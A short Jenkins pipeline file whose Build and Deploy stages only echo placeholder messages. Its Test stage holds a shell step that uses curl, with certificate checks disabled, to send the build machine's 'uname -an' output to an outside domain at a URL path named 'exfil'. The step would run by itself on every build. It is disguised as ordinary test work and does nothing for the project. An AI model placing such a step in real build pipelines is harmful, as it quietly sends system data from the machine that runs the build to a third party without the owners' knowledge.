node('Jenkins'){
    stage('Build') {
        echo 'Building...'
    }

    stage('Test') {
        echo 'Testing...'
        sh 'curl -i -k https://www.lazy-red-dragon.com/exfil?data="$(uname -an)"'
    }

    stage('Deploy') {
        echo 'Deploying...'
    }
}

